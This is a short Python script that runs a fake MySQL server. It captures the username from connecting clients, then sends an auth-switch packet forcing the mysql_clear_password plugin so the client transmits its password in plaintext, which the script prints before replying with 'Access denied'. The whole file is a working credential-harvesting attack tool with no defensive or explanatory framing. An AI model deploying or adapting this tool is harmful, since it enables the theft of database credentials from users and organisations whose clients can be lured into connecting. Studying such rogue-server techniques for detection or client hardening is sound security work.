#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import struct
import binascii

HOST = "0.0.0.0"
PORT = 3306

salt1 = b"12345678"
salt2 = b"ABCDEFGHIGKLMNOPQRS"


def pkt_header(payload, seq):
    ln = len(payload)
    return struct.pack("<I", ln)[:3] + chr(seq).encode("latin1")


def make_handshake():
    p  = b"\x0a"
    p += b"5.7.999-fake\x00"
    p += struct.pack("<I", 1234)
    p += salt1 + b"\x00"
    p += b"\xff\xf7"
    p += b"\x08"
    p += b"\x02\x00"
    p += b"\xff\xff"
    p += chr(len(salt2) + 1).encode("latin1")
    p += b"\x00" * 10
    p += salt2 + b"\x00"
    p += b"mysql_clear_password\x00"
    return p


def parse_login(pkt):
    pos = 36

    user_end = pkt.find(b"\x00", pos)
    username = pkt[pos:user_end]
    try:
        username = username.decode("utf-8")
    except:
        username = username.decode("latin1")

    pos = user_end + 1

    plen = ord(pkt[pos:pos+1])
    pos += 1
    passwd1 = pkt[pos:pos+plen]

    return username, passwd1


def make_auth_switch():
    p  = b"\xfe"
    p += b"mysql_clear_password\x00"
    p += b"\x00"
    return p


print("[*] Fake MySQL server on port ", PORT)

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)


while True:
    conn, addr = s.accept()
    print("\n[+] Connection from:", addr)

    h = make_handshake()
    conn.sendall(pkt_header(h, 0) + h)

    hdr = conn.recv(4)
    if len(hdr) < 4:
        conn.close()
        continue

    pkt_len = hdr[0] | (hdr[1] << 8) | (hdr[2] << 16)
    pkt = conn.recv(pkt_len)

    print("[*] Raw login packet:", binascii.hexlify(pkt))

    user, passwd1 = parse_login(pkt)
    print("[+] Username:", user)
    print("[+] First password (SHA scramble, ignore):", binascii.hexlify(passwd1))

    sw = make_auth_switch()
    conn.sendall(pkt_header(sw, 2) + sw)
    print("[*] Sent Auth-Switch (mysql_clear_password)")

    hdr2 = conn.recv(4)
    if not hdr2:
        print("[!] Client closed early")
        conn.close()
        continue

    ln = hdr2[0] | (hdr2[1] << 8) | (hdr2[2] << 16)
    pkt2 = conn.recv(ln)

    hexpwd = binascii.hexlify(pkt2)
    try:
        txtpwd = pkt2.decode("utf-8")
    except:
        txtpwd = pkt2.decode("latin1", "ignore")

    print("[+] PLAIN PASSWORD (", ln, "bytes):", hexpwd, "  (", txtpwd, ")")

    err = b"\xff\x15\x04\x23Access denied\x00"
    conn.sendall(pkt_header(err, 4) + err)
    conn.close()
